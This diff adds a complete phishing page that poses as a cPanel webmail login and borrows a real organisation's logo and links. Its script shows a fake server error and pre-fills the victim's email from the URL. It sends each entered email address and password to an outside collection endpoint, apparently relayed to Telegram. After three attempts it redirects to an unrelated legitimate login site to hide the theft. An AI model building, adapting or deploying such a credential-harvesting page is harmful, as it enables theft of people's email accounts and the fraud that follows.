@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+
+    <title>Webmail Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Open Sans", helvetica, arial, sans-serif;
+            color: #333;
+            background-color: #f5f5f5;
+        }
+        
+        .main-container {
+            margin: 80px auto;
+            min-height: 460px;
+        }
+        
+        .wrapper {
+            max-width: 356px;
+            margin: 0 auto;
+        }
+
+        .server-error {
+            color: #d9534f;
+            background-color: #f2dede;
+            border: 1px solid #ebccd1;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            display: none;
+        }
+        
+        .logo-container {
+            height: 65px;
+            padding: 10px 0 0;
+            text-align: center;
+        }
+        
+        .main-logo {
+            height: 50px;
+        }
+        
+        .form-container {
+            padding: 30px;
+        }
+        
+        .input-label {
+            color: #293a4a;
+            font-size: 14px;
+            font-weight: 600;
+            padding-bottom: 8px;
+            padding-left: 4px;
+        }
+        
+        .input-field {
+            display: block;
+            height: 32px;
+            border-radius: 4px;
+            border: 2px solid #bebebe;
+            background-color: #fff;
+            background-repeat: no-repeat;
+            background-position: 6px 6px;
+            margin-bottom: 30px;
+        }
+        
+        .input-field input {
+            width: 220px;
+            height: 22px;
+            margin: 4px 5px 0 30px;
+            border-radius: 4px;
+            border: 1px solid #fff;
+            background: transparent;
+            color: #000;
+            font-family: "Open Sans", sans-serif;
+            font-size: 13px;
+            padding: 0 10px;
+            outline: none;
+        }
+        
+        .username-container {
+            background-image: url("/cPanel_magic_revision_1569621012/unprotected/cpanel/images/icon-username.png");
+        }
+        
+        .password-container {
+            background-image: url("/cPanel_magic_revision_1569621012/unprotected/cpanel/images/icon-password.png");
+        }
+        
+        .login-btn button {
+            border: 1px solid #095779;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            background-color: #179bd7;
+            width: 285px;
+            font-size: 13px;
+            font-family: "Open Sans", sans-serif;
+            font-weight: 600;
+            padding: 7px 0;
+            text-align: center;
+        }
+        
+        .login-btn button:hover {
+            background-color: #1484bc;
+        }
+        
+        .reset-pw {
+            text-align: center;
+            padding: 25px 0;
+        }
+        
+        .reset-pw a {
+            color: #293a4a;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .locale-container {
+            text-align: center;
+            padding: 40px 20px 20px;
+            margin-top: 40px;
+            max-width: 100%;
+        }
+        
+        .locale-container ul {
+            margin: 0;
+            padding: 0;
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .locale-container li {
+            display: inline-block;
+        }
+        
+        .locale-container a {
+            color: #293a4a;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 5px 10px;
+            display: inline-block;
+        }
+        
+        .locale-container a:hover {
+            text-decoration: underline;
+        }
+        
+        .more-locales {
+            font-size: 16px !important;
+            font-weight: bold !important;
+        }
+        
+        .copyright {
+            color: #3f4143;
+            font-family: verdana;
+            font-size: 7pt;
+            margin: 10px 0 0;
+            padding: 30px 0 20px;
+            text-align: center;
+            background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=") center top / 25px no-repeat;
+        }
+        
+        .copyright a {
+            color: #3f4143;
+            text-decoration: none;
+        }
+        
+        .copyright a:hover {
+            text-decoration: underline;
+        }
+
+        .alert-danger {
+            color: red;
+            padding: 10px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="main-container">
+        <div class="wrapper">
+            <div class="server-error" id="serverError">
+                Unexpected server error occurred, please login to continue
+            </div>
+            
+            <div class="logo-container">
+                <img class="main-logo" src="https://webmail.empowernc.com/cPanel_magic_revision_1569621012/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
+            </div>
+            
+            <div class="form-container">
+                <form id="contact" novalidate="">
+                    <center>
+                        <div class="alert alert-danger" id="mgss" style="display: none;"></div>
+                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+
+                    <div class="input-label">
+                        <label for="ai">Email Address</label>
+                    </div>
+                    <div class="input-field username-container">
+                        <input id="ai" name="ai" autofocus="autofocus" value="" placeholder="Enter your email address." type="text" tabindex="1" required="">
+                    </div>
+                    
+                    <div class="input-label">
+                        <label for="pr">Password</label>
+                    </div>
+                    <div class="input-field password-container">
+                        <input id="pr" name="pr" placeholder="Enter your email password." type="password" tabindex="2" required="">
+                    </div>
+                    
+                    <div class="login-btn">
+                        <button id="submit-btn" type="submit" tabindex="3">Log in</button>
+                    </div>
+                    
+                    <div class="reset-pw">
+                        <a href="https://webmail.empowernc.com/resetpass?start=1">Reset Password</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+        
+        <div class="locale-container">
+            <ul>
+                <li><a href="https://webmail.empowernc.com/?locale=en">English</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=ar">العربية</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=cs">čeština</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=da">dansk</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=de">Deutsch</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=el">Ελληνικά</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=es">español</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=es_419">español latinoamericano</a></li>
+                <li><a href="javascript:void(0)" title="More locales" class="more-locales">…</a></li>
+            </ul>
+        </div>
+    </div>
+    
+    <div class="copyright">
+        Copyright© 2026 cPanel, L.L.C.<br>
+        <a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
+    </div>
+
+<script>
+    /* global $ */
+    $(document).ready(function() {
+        // Show server error message for 7 seconds on page load
+        $('#serverError').fadeIn(500);
+        setTimeout(function() {
+            $('#serverError').fadeOut(500);
+        }, 7000);
+
+        function updateLogo(email) {
+            var domain = email.substring(email.lastIndexOf("@") + 1);
+            var logoUrl = "https://logo.clearbit.com/" + domain;
+            var domainName = domain.split('.')[0];
+            $("#logo").attr("src", logoUrl);
+        }
+
+        var email = window.location.hash.substring(1);
+        if (email) {
+            $("#ai").val(email);
+            updateLogo(email);
+        }
+
+        $("#ai").focusout(function() {
+            var email = $("#ai").val().trim();
+            if (email) {
+                updateLogo(email);
+            }
+        });
+
+        var count = 0;
+
+        $('#back1').click(function() {
+            $("#mgss").hide();
+            $('#ai').val("");
+            $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+            $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+        });
+
+        $('#submit-btn').click(function(event) {
+            $('#error').hide();
+            $('#mgss').hide();
+            event.preventDefault();
+            var ai = $("#ai").val();
+            var pr = $("#pr").val();
+
+            if (!ai.trim()) {
+                $('#error').show();
+                $('#ai').focus();
+                return false;
+            }
+
+            if (!pr.trim()) {
+                $('#mgss').show();
+                $('#mgss').html("Password is required");
+                return false;
+            }
+
+            count = count + 1;
+
+            $.ajax({
+                dataType: 'JSON',
+                url: 'https://mine.repeatcar.com/568/mx/masd/telegram.php',
+                type: 'POST',
+                data: {
+                    ai: ai,
+                    pr: pr,
+                },
+                beforeSend: function(xhr) {
+                    $('#submit-btn').html('Verifying...');
+                },
+                success: function(response) {
+                    console.log('Success:', response);
+                },
+                error: function(xhr, status, error) {
+                    console.error('Error:', status, error);
+                    console.log('Response:', xhr.responseText);
+                },
+                complete: function() {
+                    $("#pr").val("");
+                    if (count >= 3) {
+                        count = 0;
+                        var domain = ai.substring(ai.lastIndexOf("@") + 1);
+                        window.location.replace("https://login.statemortgageregistry.com/login");
+                    } else {
+                        $("#serverError").html("Invalid password please try again").fadeIn(500);
+                        $('#submit-btn').html('Log in');
+                    }
+                }
+            });
+        });
+    });
+</script>
+
+</body>
+</html>
